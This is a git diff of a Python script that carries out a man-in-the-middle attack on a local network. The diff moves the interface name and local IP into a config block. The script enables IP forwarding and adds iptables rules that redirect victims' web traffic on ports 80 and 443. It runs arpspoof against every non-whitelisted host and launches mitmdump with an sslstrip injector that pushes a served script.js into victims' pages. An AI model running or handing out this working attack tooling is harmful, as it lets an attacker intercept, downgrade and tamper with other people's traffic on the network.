@@ -1,7 +1,11 @@
 import subprocess, re, os, sys
 
+#### BEGIN CONFIG ####
 whitelist = 'whitelist.txt' # IP addresses not to target
-port = '8080' # port to redirect traffic to
+port = '8080' # port for IPTables
+adapter = 'wlan0' # change to match your ifconfig setup (eth0, eth1, wlan0, etc.)
+lhost = '192.168.0.14' # local ip of this machine
+####  END CONFIG  ####
 
 def get_victims(gateway):
     victims = []
@@ -35,18 +39,18 @@ for v in victims:
 
 # configure routing (IPTABLES)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-os.system("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
+os.system("iptables -t nat -A POSTROUTING -o " + adapter + " -j MASQUERADE")
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port)
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port " + port)
 
 
 # run the arpspoof for each victim, each one in a new console
 for victim in victims:
-    os.system("xterm -e arpspoof -i wlan0 -t " + victim + " " + gateway + " &")
-    os.system("xterm -e arpspoof -i wlan0 -t " + gateway + " " + victim + " &")
+    os.system("xterm -e arpspoof -i " + adapter + " -t " + victim + " " + gateway + " &")
+    os.system("xterm -e arpspoof -i " + adapter + " -t " + gateway + " " + victim + " &")
 
 # start the http server for serving the script.js, in a new console
 os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://192.168.0.14:8000/script.js' -T")
+os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://" + lhost + ":8000/script.js' -T")
